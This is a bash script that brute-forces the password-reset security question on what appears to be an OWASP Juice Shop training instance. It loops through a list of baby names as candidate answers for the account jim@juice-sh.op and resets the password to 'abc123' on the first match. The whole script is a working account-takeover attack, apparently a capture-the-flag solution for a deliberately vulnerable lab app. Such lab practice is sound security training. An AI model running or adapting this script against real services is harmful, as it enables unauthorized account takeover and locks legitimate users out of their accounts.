#!/bin/bash

for n in $(cat girl_boy_names_2021.json | jq -r '.boys[]') $(cat girl_boy_names_2021.json | jq -r '.girls[]'); do
    curl 'https://juice.8-thousander.me/rest/user/reset-password' \
        -H 'authority: juice.8-thousander.me' \
        -H 'accept: application/json, text/plain, */*' \
        -H 'accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6' \
        -H 'content-type: application/json' \
        -H 'cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=jg8V4ek6x7l0pltRUJTwFEfbSyH5iKmfwBCDLSajivJfmEURw0Jbv9LaQw1n' \
        -H 'dnt: 1' \
        -H 'origin: https://juice.8-thousander.me' \
        -H 'referer: https://juice.8-thousander.me/' \
        -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
        -H 'sec-ch-ua-mobile: ?0' \
        -H 'sec-ch-ua-platform: "macOS"' \
        -H 'sec-fetch-dest: empty' \
        -H 'sec-fetch-mode: cors' \
        -H 'sec-fetch-site: same-origin' \
        -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
        --data-raw "{\"email\":\"jim@juice-sh.op\",\"answer\":\"${n}\",\"new\":\"abc123\",\"repeat\":\"abc123\"}" \
        --compressed --fail -sS && break
done
